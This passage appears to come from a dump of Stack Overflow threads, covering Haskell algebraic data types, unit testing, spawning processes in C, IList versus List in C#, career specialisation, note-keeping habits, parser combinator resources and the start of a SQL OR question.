<p>This could be implemented in C# as a TreeNode base class, with a derived Leaf class and a derived TreeNodeWithChildren class, and if you want even a derived EmptyNode class.</p>

<p>(OK I know, nobody would ever do that, but at least you could do it.)</p>
 <p>Haskell's datatypes are called ""algebraic"" because of their connection to <a href=""http://en.wikipedia.org/wiki/Initial_algebra"">categorical initial algebras</a>. But that way lies madness.</p>

<p>@olliej: ADTs are actually ""sum"" types. Tuples are products.</p>
 <p>@Timbo:</p>

<p>You are basically right about it being sort of like an abstract Tree class with three derived classes (Empty, Leaf, and Node), but you would also need to enforce the guarantee that some one using your Tree class can never add any new derived classes, since the strategy for using the Tree datat type is to write code that switches at runtime based on the type of each element in the tree (and adding new derived types would break existing code). You can sort of imagine this getting nasty in C# or C++, but in Haskell, ML, and OCaml, this is central to the language design and syntax so coding style supports it in a much more convenient manner, via pattern matching.</p>

<p>ADT (sum types) are also sort of like <a href=""http://en.wikipedia.org/wiki/Tagged_union"" rel=""nofollow"">tagged unions</a> or <a href=""http://en.wikipedia.org/wiki/Variant_type"" rel=""nofollow"">variant types</a> in C or C++.</p>
 <p>old question, but no one's mentioned nullability, which is an important aspect of Algebraic Data Types, perhaps the most important aspect.  Since each value most be one of alternatives, exhaustive case-based pattern matching is possible.  </p>
 <p>In <a href=""http://en.wikipedia.org/wiki/Universal_algebra"">universal algebra</a> 
an <i>algebra</i> consists of some sets of elements
(think of each set as the set of values of a type)
and some operations, which map elements to elements.</p>

<p>For example, suppose you have a type of ""list elements"" and a
type of ""lists"".  As operations you have the ""empty list"", which is a 0-argument
function returning a ""list"", and a ""cons"" function which takes two arguments,
a ""list element"" and a ""list"", and produce a ""list"".</p>

<p>At this point there are many algebras that fit the description,
as two undesirable things may happen:</p>

<ul>
<li><p>There could be elements in the ""list"" set which cannot be built
from the ""empty list"" and the ""cons operation"", so-called ""junk"".
This could be lists starting from some element that fell from the sky,
or loops without a beginning, or infinite lists.</p></li>
<li><p>The results of ""cons"" applied to different arguments could be equal,
e.g. consing an element to a non-empty list
could be equal to the empty list.  This is sometimes called ""confusion"".</p></li>
</ul>

<p>An algebra which has neither of these undesirable properties is called
<i>initial</i>, and this is the intended meaning of the abstract data type.</p>

<p>The name initial derives from the property that there is exactly
one homomorphism from the initial algebra to any given algebra.
Essentially you can evaluate the value of a list by applying the operations
in the other algebra, and the result is well-defined.</p>

<p>It gets more complicated for polymorphic types ...</p>
 <p>A simple reason why they are called algebraic; there are both sum (logical disjunction) and product (logical conjunction) types. A sum type is a discriminated union, e.g:</p>

<pre><code>data Bool = False | True
</code></pre>

<p>A product type is a type with multiple parameters:</p>

<pre><code>data Pair a b = Pair a b
</code></pre>

<p>In O'Caml ""product"" is made more explicit:</p>

<pre><code>type 'a 'b pair = Pair of 'a * 'b
</code></pre>
 <p>Haskell's <em>algebraic data types</em> are named such since they correspond to an <em>initial algebra</em> in category theory, giving us some laws, some operations and some symbols to manipulate. We may even use algebraic notation for describing regular data structures, where:</p>

<ul>
<li><code>+</code> represents sum types (disjoint unions, e.g. <code>Either</code>).</li>
<li><code>•</code> represents product types (e.g. structs or tuples)</li>
<li><code>X</code> for the singleton type (e.g. <code>data X a = X a</code>)</li>
<li><code>1</code> for the unit type <code>()</code></li>
<li>and <em><code>μ</code></em> for the least fixed point (e.g. recursive types), usually implicit.</li>
</ul>

<p>with some additional notation:</p>

<ul>
<li><code>X²</code> for <code>X•X</code></li>
</ul>

<p>In fact, you might say (following Brent Yorgey) that a Haskell data type is regular if it can be expressed in terms of <code>1</code>, <code>X</code>, <code>+</code>, <code>•</code>, and a least ﬁxed point.</p>

<p>With this notation, we can concisely describe many regular data structures:</p>

<ul>
<li><p>Units: <code>data () = ()</code></p>

<p><code>1</code></p></li>
<li><p>Options: <code>data Maybe a = Nothing | Just a</code></p>

<p><code>1 + X</code></p></li>
<li><p>Lists: <code>data [a] = [] | a : [a]</code></p>

<p><code>L = 1+X•L</code></p></li>
<li><p>Binary trees: <code>data BTree a = Empty | Node a (BTree a) (BTree a)</code></p>

<p><code>B = 1 + X•B²</code></p></li>
</ul>

<p>Other operations hold (taken from Brent Yorgey's paper, listed in the references):</p>

<ul>
<li><p>Expansion: unfolding the fix point can be helpful for thinking about lists. <code>L = 1 + X + X² + X³ + ...</code> (that is, lists are either empty, or they have one element, or two elements, or three, or ...)</p></li>
<li><p>Composition, <code>◦</code>, given types <code>F</code> and <code>G</code>, the composition <code>F ◦ G</code> is a type which builds “F-structures made out of G-structures” (e.g. <code>R = X • (L ◦ R)</code> ,where <code>L</code> is lists, is a rose tree.</p></li>
<li><p>Differentiation, the derivative of a data type D (given as D') is the type of D-structures with a single “hole”, that is, a distinguished location not containing any data. That amazingly satisfy the same rules as for differentiation in calculus:</p>

<p><code>1′ = 0</code></p>

<p><code>X′ = 1</code></p>

<p><code>(F + G)′ = F' + G′</code></p>

<p><code>(F • G)′ = F • G′ + F′ • G</code></p>

<p><code>(F ◦ G)′ = (F′ ◦ G) • G′</code></p></li>
</ul>

<hr>

<p><em>References:</em></p>

<ul>
<li><a href=""http://www.cis.upenn.edu/~byorgey/papers/species-pearl.pdf"">Species and Functors and Types</a>, Oh My!, Brent A. Yorgey, Haskell’10, September 30, 2010, Baltimore, Maryland, USA</li>
<li><a href=""http://personal.cis.strath.ac.uk/~conor/Dissect.pdf"">Clowns to the left of me, jokers to the right (Dissecting Data Structures)</a>, Conor McBride POPL 2008</li>
</ul>
"
"Getting Started with Unit Testing <blockquote>
  <p>Unit testing is, roughly speaking, testing bits of your code in isolation with test code. The immediate advantages that come to mind are:</p>
  
  <ul>
  <li>Running the tests becomes automate-able and repeatable</li>
  <li>You can test at a much more granular level than point-and-click testing via a GUI</li>
  </ul>
  
  <p><a href=""http://stackoverflow.com/questions/1383/what-is-unit-testing"">Rytmis</a></p>
</blockquote>

<p>My question is, what are the current ""best practices"" in terms of tools as well as when and where to use unit testing as part of your daily coding?</p>

<p>Lets try to be somewhat language agnostic and cover all the bases.</p>
 <p>The xUnit family are the mainstay of unit testing. They are integrated into the likes of Netbeans, Eclipse and many other IDEs. They offer a simple, structured solution to unit testing.</p>

<p>One thing I always try and do when writing a test is to minimise external code usage. By that I mean: I try to minimise the setup and teardown code for the test as much as possible and try to avoid using other modules/code blocks as much as possible. Well-written modular code shouldn't require too much external code in it's setup and teardown.</p>
 <p>The so-called <a href=""http://en.wikipedia.org/wiki/XUnit"" rel=""nofollow"">xUnit</a> framework is widely used. It was originally developed for Smalltalk as SUnit, evolved into JUnit for Java, and now has many other implementations such as NUnit for .Net. It's almost a de facto standard - if you say you're using unit tests, a majority of other developers will assume you mean xUnit or similar.</p>
 <p>A great resource for 'best practices' is the <a href=""http://googletesting.blogspot.com/"" rel=""nofollow"">Google Testing Blog</a>, for example a recent post on <a href=""http://googletesting.blogspot.com/2008/08/by-miko-hevery-so-you-decided-to.html"" rel=""nofollow"">Writing Testable Code</a> is a fantastic resource. Specifically their 'Testing on the Toilet' series weekly posts are great for posting around your cube, or toilet, so you can always be thinking about testing. </p>
 <p>Ok here's some best practices from some one who doesn't unit test as much as he should...cough.</p>

<ol>
<li>Make sure your tests test <a href=""http://www.artima.com/weblogs/viewpost.jsp?thread=35578"" rel=""nofollow"" title=""one"">one</a>
thing and one thing only.</li>
<li>Write unit tests as you go. Preferably <a href=""http://en.wikipedia.org/wiki/Test-driven_development"" rel=""nofollow"" title=""before"">before</a> you write the code you are testing against.</li>
<li>Do not unit test the GUI. </li>
<li><a href=""http://en.wikipedia.org/wiki/Separation_of_concerns"" rel=""nofollow"" title=""Separate your concerns"">Separate your concerns</a>. </li>
<li>Minimise the dependencies of your tests.</li>
<li>Mock behviour with <a href=""http://en.wikipedia.org/wiki/Mock_object"" rel=""nofollow"" title=""mocks"">mocks</a>.</li>
</ol>
 <p>NUnit is a good tool for any of the .NET languages.</p>

<p>Unit tests can be used in a number of ways: </p>

<ol>
<li>Test Logic</li>
<li>Increase separation of code units.  If you can't fully test a function or section of code, then the parts that make it up are too interdependant.</li>
<li>Drive development, some people write tests <em>before</em> they write the code to be tested.  This forces you to think about what you want the code to <em>do</em>, and then gives you a definite guideline on when you have acheived that.</li>
</ol>
 <p>You might want to look at <a href=""http://blog.objectmentor.com/articles/2008/03/06/tdd-on-three-index-cards"">TDD on Three Index Cards</a> and <a href=""http://blog.briandicroce.com/2008/03/14/three-index-cards-to-easily-remember-the-essence-of-test-driven-development/"">Three Index Cards to Easily Remember the Essence of Test-Driven Development</a>:</p>

<p>Card #1. Uncle Bob’s Three Laws</p>

<ul>
<li>Write no production code except to pass a failing test.</li>
<li>Write only enough of a test to demonstrate a failure.</li>
<li>Write only enough production code to pass the test.</li>
</ul>

<p>Card #2: FIRST Principles</p>

<ul>
<li>Fast: Mind-numbingly fast, as in hundreds or thousands per second.</li>
<li>Isolated: The test isolates a fault clearly.</li>
<li>Repeatable: I can run it repeatedly and it will pass or fail the same way each time.</li>
<li>Self-verifying: The Test is unambiguously pass-fail.</li>
<li>Timely: Produced in lockstep with tiny code changes.</li>
</ul>

<p>Card #3: Core of TDD</p>

<ul>
<li>Red: test fails</li>
<li>Green: test passes</li>
<li>Refactor: clean code and tests</li>
</ul>
 <p>Don't forget refactoring support. ReSharper on .NET provides automatic refactoring and quick fixes for missing code. That means if you write a call to something that does not exist, ReSharper will ask if you want to create the missing piece.</p>
"
"How do you spawn another process in C? <p>How do you run an external program and pass it command line parameters using C? If you have to use operating system API, include a solution for Windows, Mac, and Linux.</p>
 <pre><code>#include &lt;stdlib.h&gt;

int main()
{
    system(""echo HAI"");

    return 0;
}
</code></pre>
 <p>One solution is the system function defined in stdlib.h </p>

<pre><code>int system(const char *string);
</code></pre>

<p><a href=""http://www.cplusplus.com/reference/clibrary/cstdlib/system.html"" rel=""nofollow"">system api example</a></p>
 <p>On UNIX, I think you basically need to fork it if you want the spawned process to run detached from your the spawing one : For instance if you don't want your spawned process to be terminate when you quit your spawning process.</p>

<p><a href=""http://www.yolinux.com/TUTORIALS/ForkExecProcesses.html"" rel=""nofollow"">Here is a</a> page that explains all the subtle differences between Fork, System, Exec.</p>

<p>If you work on Win,Mac and linux, I can recommend you the <a href=""https://doc.qt.io/qt-5/qprocess.html"" rel=""nofollow"">Qt Framework and its QProcess object</a>, but I don't know if that's an option for you. The great advantages is that you will be able to compile the same code on windows linux and mac :</p>

<pre><code> QString program = ""./yourspawnedprogram"";
 QProcess * spawnedProcess = new QProcess(parent);
 spawnedProcess-&gt;start(program);
 // or spawnedProcess-&gt;startDetached(program);
</code></pre>

<p>And for extra, you can even kill the child process from the mother process,
and keep in communication with it through a stream.</p>
 <p>If you want to perform more complicated operations, like reading the output of the external program, you may be better served by the <a href=""http://man.he.net/man3/popen"">popen</a> system call. For example, to programmatically access a directory listing (this is a somewhat silly example, but useful <em>as</em> an example), you could write something like this:</p>

<pre><code>#include &lt;stdio.h&gt;

int main()
{
  int entry = 1;
  char line[200];
  FILE* output = popen(""/usr/bin/ls -1 /usr/man"", ""r"");
  while ( fgets(line, 199, output) )
  {
    printf(""%5d: %s"", entry++, line);
  }
}
</code></pre>

<p>to give output like this</p>

<pre><code>1: cat1
2: cat1b
3: cat1c
4: cat1f
5: cat1m
6: cat1s
...
</code></pre>
 <p>It really depends on what you're trying to do, exactly, as it's:</p>

<ol>
<li>OS dependent</li>
<li>Not quite clear what you're trying to do.</li>
</ol>

<p>Nevertheless, I'll try to provide some information for you to decide.<br />
On UNIX, <code>fork()</code> creates a clone of your process from the place where you called fork. Meaning, if I have the following process:</p>

<pre><code>#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;

int main()
{
    printf( ""hi 2 u\n"" );
    int mypid = fork();

    if( 0 == mypid )
        printf( ""lol child\n"" );
    else
        printf( ""lol parent\n"" );

    return( 0 );
}
</code></pre>

<p>The output will look as follows:</p>

<blockquote>
  <blockquote>
    <p>hi 2 u<br />
    lol child<br />
    lol parent  </p>
  </blockquote>
</blockquote>

<p>When you <code>fork()</code> the pid returned in the child is 0, and the pid returned in the parent is the child's pid. Notice that ""hi2u"" is only printed once... by the <strong>parent</strong>.</p>

<p><code>execve()</code> and its family of functions are almost always used with <code>fork().</code> <code>execve()</code> and the like overwrite the current stackframe with the name of the application you pass to it. <code>execve()</code> is almost always used with <code>fork()</code> where you fork a child process and if you're the parent you do whatever you need to keep doing and if you're the child you exec a new process. <code>execve()</code> is also almost always used with <code>waitpid()</code> -- waitpid takes a pid of a child process and, quite literally, <em>waits</em> until the child terminates and returns the child's exit status to you.  </p>

<p>Using this information, you should be able to write a very basic shell; one that takes process names on the command line and runs processes you tell it to. Of course, shells do more than that, like piping input and output, but you should be able to accomplish the basics using <code>fork()</code>, <code>execve()</code> and <code>waitpid()</code>.</p>

<p><strong>NOTE: This is *nix specific! This will NOT work on Windows.</strong>  </p>

<p>Hope this helped.</p>
 <p>If you need to check/read/parse the output of your external command, I would suggest to use popen() instead of system().</p>
 <p>Speaking of platform-dependent recipes, on Windows use <a href=""http://msdn.microsoft.com/en-us/library/ms682425.aspx"" rel=""nofollow"">CreateProcess</a>, on Posix (Linux, Mac) use <code>fork</code> + <code>execvp</code>. But <code>system()</code> should cover your basic needs and is part of standard library.</p>
 <p>I want to give a big warning to not use system and 100% never use system when you write a library. It was designed 30 years ago when multithreading was unknown to the toy operating system called Unix. And it is still not useable even when almost all programs are multithreaded today. </p>

<p>Use popen or do a fork+execvp, all else is will give you hard to find problems with signal handling, crashs in environment handling code etc. It's pure evil and a shame that the selected and most rated answer is promoting the use of ""system"". It's more healthy to promote the use of Cocain on the workplace.</p>
"
"When to use IList and when to use List <p>I know that IList is the interface and List is the concrete type but I still don't know when to use each one. What I'm doing now is if I don't need the Sort or FindAll methods I use the interface. Am I right? Is there a better way to decide when to use the interface or the concrete type?</p>
 <p>I don't think there are hard and fast rules for this type of thing, but I usually go by the guideline of using the lightest possible way until absolutely necessary.</p>

<p>For example, let's say you have a <code>Person</code> class and a <code>Group</code> class. A <code>Group</code> instance has many people, so a List here would make sense. When I declare the list object in <code>Group</code> I will use an <code>IList&lt;Person&gt;</code> and instantiate it as a <code>List</code>.</p>

<pre><code>public class Group {
  private IList&lt;Person&gt; people;

  public Group() {
    this.people = new List&lt;Person&gt;();
  }
}
</code></pre>

<p>And, if you don't even need everything in <code>IList</code> you can always use <code>IEnumerable</code> too. With modern compilers and processors, I don't think there is really any speed difference, so this is more just a matter of style.</p>
 <p>In situations I usually come across, I rarely use IList directly.</p>

<p>Usually I just use it as an argument to a method  </p>

<pre><code>void ProcessArrayData(IList almostAnyTypeOfArray)
{
    // Do some stuff with the IList array
}
</code></pre>

<p>This will allow me to do generic processing on almost any array in the .NET framework, unless it uses IEnumerable and not IList, which happens sometimes.</p>

<p>It really comes down to the kind of functionality you need. I'd suggest using the List class in most cases. IList is best for when you need to make a custom array that could have some very specific rules that you'd like to encapsulate within a collection so you don't repeat yourself, but still want .NET to recognize it as a list.</p>
 <p>If you're working within a single method (or even in a single class or assembly in some cases) and no one outside is going to see what you're doing, use the fullness of a List. But if you're interacting with outside code, like when you're returning a list from a method, then you only want to declare the interface without necessarily tying yourself to a specific implementation, especially if you have no control over who compiles against your code afterward. If you started with a concrete type and you decided to change to another one, even if it uses the same interface, you're going to break someone else's code unless you started off with an interface or abstract base type. </p>
 <p>You should use the interface only if you need it, e.g., if your list is casted to an IList implementation other than List. This is true when, for example, you use NHibernate, which casts ILists into an NHibernate bag object when retrieving data.</p>

<p>If List is the only implementation that you will ever use for a certain collection, feel free to declare it as a concrete List implementation.</p>
 <p>It's always best to use the lowest base type possible. This gives the implementer of your interface, or consumer of your method, the opportunity to use whatever they like behind the scenes.</p>

<p>For collections you should aim to use IEnumerable where possible. This gives the most flexibility but is not always suited.</p>
 <p>There are two rules I follow:</p>

<ul>
<li>Accept the most basic type that will work</li>
<li>Return the richest type your user will need</li>
</ul>

<p>So when writing a function or method that takes a collection, write it not to take a List, but an IList&lt;T&gt;, an ICollection&lt;T&gt;, or IEnumerable&lt;T&gt;.  The generic interfaces will still work even for heterogenous lists because System.Object can be a T too.  Doing this will save you headache if you decide to use a Stack or some other data structure further down the road.  If all you need to do in the function is foreach through it, IEnumerable&lt;T&gt; is really all you should be asking for.</p>

<p>On the other hand, when returning an object out of a function, you want to give the user the richest possible set of operations without them having to cast around.  So in that case, if it's a List&lt;T&gt; internally, return a copy as a List&lt;T&gt;.</p>
 <p>I would agree with Lee's advice for taking parameters, but not returning.</p>

<p>If you specify your methods to return an interface that means you are free to change the exact implementation later on without the consuming method ever knowing. I thought I'd never need to change from a List&lt;T> but had to later change to use a custom list library for the extra functionality it provided. Because I'd only returned an IList&lt;T> none of the people that used the library had to change their code.</p>

<p>Of course that only need apply to methods that are externally visible (i.e. public methods). I personally use interfaces even in internal code, but as you are able to change all the code yourself if you make breaking changes it's not strictly necessary.</p>
 <p>Microsoft guidelines as checked by FxCop discourage use of List&lt;T&gt; in public APIs - prefer IList&lt;T&gt;.</p>

<p>Incidentally, I now almost always declare one-dimensional arrays as IList&lt;T&gt;, which means I can consistently use the IList&lt;T&gt;.Count property rather than Array.Length.  For example:</p>

<pre><code>public interface IMyApi
{
    IList&lt;int&gt; GetReadOnlyValues();
}

public class MyApiImplementation : IMyApi
{
    public IList&lt;int&gt; GetReadOnlyValues()
    {
        List&lt;int&gt; myList = new List&lt;int&gt;();
        ... populate list
        return myList.AsReadOnly();
    }
}
public class MyMockApiImplementationForUnitTests : IMyApi
{
    public IList&lt;int&gt; GetReadOnlyValues()
    {
        IList&lt;int&gt; testValues = new int[] { 1, 2, 3 };
        return testValues;
    }
}
</code></pre>
 <p>You are most often better of using the most general usable type, in this case the IList or even better the IEnumerable interface, so that you can switch the implementation conveniently at a later time.</p>

<p>However, in .NET 2.0, there is an annoying thing - IList does not have a <strong>Sort()</strong> method. You can use a supplied adapter instead:</p>

<pre><code>ArrayList.Adapter(list).Sort()
</code></pre>
 <p><strong>IEnumerable</strong> 
you should try and use the least specific type that suits your purpose. IEnumerable is less specific than IList 
You use IEnumerable when you want to loop through the items in a collection</p>

<p><strong>IList</strong> 
IList implements IEnumerable
You should use IList when you need access by index to your collection, add and delete elements, etc..</p>

<p><strong>List</strong> 
List implements IList</p>
 <p>AList object allows you to create a list, add things to it, remove it, update it, index into it and etc. List is used whenever you just want a generic List where you specify object type in it and that's it.</p>

<p>IList on the other hand is an Interface. Basically, if you want to create your own type of List, say a list class called BookList, then you can use the Interface to give you basic methods and structure to your new class. IList is for when you want to create your own, special sub-class that implements List.</p>

<p>Another difference is:
 IList is an Interface and cannot be instantiated. List is a class and can be instantiated. It means:</p>

<pre><code>IList&lt;string&gt; MyList = new IList&lt;string&gt;();

List&lt;string&gt; MyList = new List&lt;string&gt;
</code></pre>
 <p>There's an important thing that people always seem to overlook:</p>

<p>You can pass a plain array to something which accepts an <code>IList&lt;T&gt;</code> parameter, and then you can call <code>IList.Add()</code> and will receive a runtime exception:</p>

<p><code>Unhandled Exception: System.NotSupportedException: Collection was of a fixed size.</code></p>

<p>For example, consider the following code:</p>

<pre><code>private void test(IList&lt;int&gt; list)
{
    list.Add(1);
}
</code></pre>

<p>If you call that as follows, you will get a runtime exception:</p>

<pre><code>int[] array = new int[0];
test(array);
</code></pre>

<p>This happens because using plain arrays with <code>IList&lt;T&gt;</code> violates the Liskov substitution principle.</p>

<p>For this reason, if you are calling <code>IList&lt;T&gt;.Add()</code> you may want to consider requiring a <code>List&lt;T&gt;</code> instead of an <code>IList&lt;T&gt;</code>.</p>
"
"What areas of specialization within programming would you recommend to a beginner <p>I am a student studying software development, and I feel programming, in general, is too broad of a subject to try to know everything. To be proficient, you have to decide which areas to focus your learning and understanding. Certain skill sets synergize with each other, like data-driven web development and SQL experience. However, all the win32 API experience in the world may not directly apply to linux development. This leads me to believe, as a beginning programmer, I should start deciding where I want to specialize after I have general understanding of the basic principles of software development. </p>

<p>This is a multi-part question really: </p>

<ol>
<li>What are the common specializations within computer programming and software development?  </li>
<li>Which of these specializations have more long-term value, both as a foundation for other specializations and/or as marketable skills? </li>
<li>Which skill sets complement each other? </li>
<li>Are there any areas of specialization that hinder your ability of developing other areas of specialization.</li>
</ol>
 <p>Not to directly reject your premise but I actually think being a generalist is a good position in programming. You will certainly develop expertise in specific areas but it is likely to be a product of either personal interest or work necessity. Over time the stuff you are able to transfer across languages and problem domains is at the heart of what makes good programmers.</p>
 <p>I think the more important question is: What areas of specialization are you most interested in?</p>

<p>Once you know, begin learning in that area!</p>
 <p>Ben, Almost all seasoned programmers are still students in programming. You never stops learning anything when you are a developer. But if you are really starting off on your career then you should be least worried about the specialization thing. All APIs, frameworks and skills that you expect that gives you a long term existence in the field is not going to happen. Technology seems changing a lot and you should be versatile and flexible enough to learn anything. The knowledge you acquire on one platform/api/framework doesn't die off. You can apply the skills to the next greatest platform/api/framework. </p>

<p>That being said you should just stop worrying about the future and concentrate on the basics. DataStructures, Algorithm Analysis and Design, Compiler Design, Operating system design are the bare minimum stuff you need.  And further you should be willing to go back and read tho books in those field any time in your career. Thats all is required. Good luck. </p>

<p>Sorry if I sounded like a big ass advisor; but thats what I think. :-)</p>
 <p>I would think the greatest skill of all would be to adapt with the times, because if your employer can see this potential in you then they would be wise to hold on tightly.  </p>

<p>That said, I would advise you dive into the area YOU would enjoy. <em>Learning is driven by enthusiasm</em>.  </p>

<p>Since my current employ is with an internet provider, I've found networking knowledge particularly helpful. But someday I'd like to play with 3D graphics (not necessarily games).</p>
 <p>Go as deep as you can starting off in one environment, win32, .net, Java, Objective C... whatever.  </p>

<p>It is important to build the deep understanding of how X works... so that you can translate the same concepts into other languages or platforms/environments, if you so desire.  </p>

<p>""Are there any areas of specialization that hinder your ability of developing other areas of specialization.""  Sort of, but nothing permanent i think.</p>

<p>Since I am relatively green myself (less than 4 years) I come from a really OOP mindset.  I've rarely jumped out of .NET, so I had a hard time on one job when coming into contact with embedded code.  With embedded programmers fearing object creation and the performance loss of inheritance.  I had to learn the environment, seriously low memory and slow clock times, they were coming from.  Those are times to grow, I had a better time at it because i understood my area pretty well.</p>

<p>I will say if you pick something to specialize in for marketability and money, you will probably burn out fast.  If you do start to specialize pick something you enjoy.  I love GUI programing and hate server side stuff, my buddy is the opposite, but we both love our jobs.  If he had to do my job, and I his, we would both go insane out of boredom.</p>
 <p>As a student I'd recommend forgetting about what you're programming and focusing on the software process itself. Understand how to analyse a problem and ask the right questions; learn every design pattern you can and actually <strong>apply them all</strong> to gain a real understanding and appreciation of object-oriented design; write tests and then code only as much as you need to in order to make the tests pass. I think the best way to really learn is to just code as much as you can - the language and the domain aren't important, browse <a href=""http://www.sourceforge.net"" rel=""nofollow"">sourceforge</a> and <a href=""http://www.freshmeat.net"" rel=""nofollow"">freshmeat</a> for any interesting-sounding projects and get involved. What's important is understanding the fundamentals of software engineering.</p>

<p>And yes, this includes C. Or Assembler. This is the easiest way to get a good understanding of how your computer works and what your high-level code is actually doing.</p>

<p>Finally, never stop learning - Service-oriented architecture, inversion of control, domain-specific languages, business process management are all showing huge benefits so they're important to be aware of - But by the time you finish studying and join the workforce who knows what the next big thing will be?</p>
"
"Tracking Useful Information <p>What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.</p>

<p>I sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?</p>

<p>So.. what do you do?</p>
 <p>Two Things I do:</p>

<ul>
<li>I blog about it - this allows me to go back and search my own blog.</li>
<li>We use the code snippet feature in Visual Studio.</li>
</ul>

<p>Cheers.</p>
 <p>Why not set up a Wiki?<br />
If you are on windows, i know that <a href=""http://www.screwturn.eu/Default.aspx"" rel=""nofollow"">ScrewTurn wiki</a> is pretty simple to deploy on a desktop/laptop.  No database to fuss around with.</p>
 <p>Blog about it. </p>

<p>One of the nice side-effects of blogging is that if you use a sensible categorization or tagging system, it's quite easy to search for stuff within your blog. The fact that you wrote about it also makes it easier to remember problems you have encountered before (""hey, I blogged about that!"").</p>

<p>That's a great benefit aside from, of course, being able to share this information publicly so that others might be able to find your solution to a particular problem using Google.</p>
 <p>I send them to my gmail account, that way I have them where ever I go, and they can be put into appropriate folders for later.</p>
 <p>I second the blog about it technique...even Jeff said that's a <a href=""http://www.codinghorror.com/blog/archives/000021.html"" rel=""nofollow"">major reason he blogs.</a></p>

<p>Also, regarding the wiki idea, if you set one up at work, be sure to encourage your coworkers to do the same.  When someone finds something of interest they can just write a little ""article"" explaining what it is and how to do it... that way, not only are your own things easily available and quickly searchable, but you'll often find out things you never knew from other people in your group.  That way it benefits <em>everyone</em> not just you.</p>
 <p>I agree with emailing, the wiki and the blog. Emailing is the most useful. If you can't use GMail and you're on windows, install a desktop search utility (Windows search, Google Desktop, Copernic, etc)</p>

<p>I also like to jot it into a textfile and save it in my documents folder. Whatever desktop search utility you use will be able to find it easily. e.g.  </p>

<pre><code>//print spool stop.notes.txt
If the printer spooler stops, start it again by 
- Services &gt; Provision Networks &gt; Restart Service

tags: printer provision no printer spooler cannot print remote desktop
</code></pre>
 <p>Subscribe in Google Reader and then search later.</p>
 <p>A number of people I know swear by <a href=""http://www.google.com/notebook"" rel=""nofollow"">Google Notebook</a></p>
 <p>At my last place of work they wouldn't let me set up a wiki or anything - so I just made various word documents full of tips and instructions and gave that to my successor when I left.</p>

<p>Now though I'd use a private wiki, or maybe a blog.</p>
 <p>I use:</p>

<ol>
<li><a href=""http://notebook.google.com"" rel=""nofollow"">Google Notebook</a> - I take notes for projects, books I'm reading, etc</li>
<li><a href=""http://delicious.com"" rel=""nofollow"">Delicious</a> + Firefox plug in - Every time I see a good page I mark it.</li>
<li><a href=""http://en.wikipedia.org/wiki/Windows_Journal"" rel=""nofollow"">Windows Journal</a> (in tablet pc) - When I need to draw something and then copy/cut/paste it. I have more distractions here, the web is always very close :)</li>
<li>Small <a href=""http://www.moleskine.com/eng/_interni/catalogo/Cat_int/catalogo_notebooks.htm"" rel=""nofollow"">Moleskine</a> paper notebook - Its always with me.</li>
<li>Big paper notebook - When I need more space to write and less distractions.</li>
</ol>

<p>Obviously these are for all useful information, not just for snippets or tips and tricks.</p>
 <p>For many years I've kept a Word doc named Knowledgebase.doc that contains all my notes with a decent table of contents.  I like to keep everything in one searchable doc.</p>

<p>I use a sync tool to make sure the file is copied to all the machines I want it on.</p>
 <p>I use  <a href=""http://www.tiddlywiki.com/"" rel=""nofollow"">TiddlyWiki</a> stored in my DropBox account. Although, recently, Evernote is getting my atention; it has a really useful feature: you send a twitter direct message to evernote user (myen) and it adds a note with your message (a really quick way to add notes or URL's for post-processing). Imagine, you can use a command-line twitter client to create notes! (or any twitter client). I really like this feature.</p>
"
"How can I learn about parser combinators? <p>I've found a few resources on the subject, but they all require a deep understanding of <a href=""http://en.wikipedia.org/wiki/Smalltalk"">SmallTalk</a> or <a href=""http://en.wikipedia.org/wiki/Haskell_%28programming_language%29"">Haskell</a>, neither of which I know.</p>
 <p>I found <a href=""http://blogs.msdn.com/lukeh/archive/2007/08/19/monadic-parser-combinators-using-c-3-0.aspx"" rel=""nofollow"">an interesting article about implementing a parser combinator in C#</a>. It also references some more general papers on the subject.</p>

<p><a href=""http://en.wikipedia.org/wiki/Parser_Combinator"" rel=""nofollow"">The Wikipedia article on the subject</a> also has a general explaination of the concept. </p>
 <p>Here are some parser combinator libraries in more mainstream languages:</p>

<ul>
<li><a href=""http://spirit.sourceforge.net/documentation.html"">Spirit</a> (C++)</li>
<li><a href=""http://jparsec.codehaus.org/"">Jparsec</a> (Java)</li>
</ul>
 <p>I wrote 8 longish blog entries on monadic parser combinators in C# and F#; see <a href=""http://lorgonblog.spaces.live.com/blog/cns!701679AD17B6D310!123.entry"">here</a> for the first one.</p>

<p>See also <a href=""http://www.quanttec.com/fparsec/"">FParsec</a> (Parsec for F#)</p>
 <p>If you know Python, there's <a href=""http://pyparsing.wikispaces.com/"" rel=""nofollow"">PyParsing</a>.</p>
 <p>Chrise Double wrote <a href=""http://www.bluishcoder.co.nz/2007/10/javascript-parser-combinators.html"" rel=""nofollow"">a parser combinator in Javascript</a>.</p>
 <p><s>Cay Horstmann has <a href=""http://horstmann.com/sjsu/cs152/schedule.html"" rel=""nofollow"">4 combinator parser lectures in Scala</a>, with exercises.</s> There is an example of parsing external DSLs in Scala <a href=""http://debasishg.blogspot.com/2008/04/external-dsls-made-easy-with-scala.html"" rel=""nofollow"">here</a>.</p>
 <p><a href=""http://www.cc.gatech.edu/grads/l/lorgon/Talks/MonPar/monpar.html"" rel=""nofollow"">Here</a> is a link to a talk (slides and script) on monadic parser combinators in C++.</p>
 <p>There are some great articles on the web describing parser combinators in C#, but no maintainable source repository, so I've created one at:</p>

<p><a href=""http://code.google.com/p/sprache/"" rel=""nofollow"">http://code.google.com/p/sprache/</a></p>

<p>Someone knowledgeable about parser combinators could probably do a lot to improve it (please step forward if this sounds like you :))</p>
 <p>For me <a href=""http://www.cs.nott.ac.uk/~gmh/monparsing.ps"" rel=""nofollow"">this</a> paper was extremly useful. It is almost languange neutral. Just in some small places they are reffering to <a href=""http://en.wikipedia.org/wiki/Gofer_%28programming_language%29"" rel=""nofollow"">Gofer</a>.</p>
 <p><a href=""http://www.codecommit.com/blog/scala/the-magic-behind-parser-combinators"" rel=""nofollow"">http://www.codecommit.com/blog/scala/the-magic-behind-parser-combinators</a></p>
"
"Select ..... where .... OR  <p>Is there a way to select data where any one of multiple conditions occur on the same field?</p>

<p>Example: I would typically write a statement such as:</p>

<pre><code>select * from TABLE where field = 1 or field = 2 or field = 3
</code></pre>

<p>Is there a way to instead say something like:</p>

